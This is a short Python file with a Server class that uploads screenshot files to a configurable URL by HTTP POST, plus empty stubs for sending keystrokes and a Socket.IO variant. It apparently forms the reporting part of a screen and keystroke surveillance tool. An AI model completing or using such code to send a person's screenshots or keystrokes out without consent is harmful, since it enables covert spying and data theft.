import base64

import requests


class Server:
    def __init__(self, URL):
        self.URL = URL
    def send_screenshot(self, file):
        #make a POST request to my_server
        print("sending screenshooots!")
        file.seek(0)
        #files_string = base64.b64encode(file.read()).decode("utf-8")
        myobj = {'file': file}
        try:
            response = requests.post(self.URL, files = myobj)
            print(f"Server Response: {response.text}")
        except Exception as e:
            print("Some exception: {e}")
            pass


    def send_keystrokes(self):
        pass

class ServerWithSocketIO:
    pass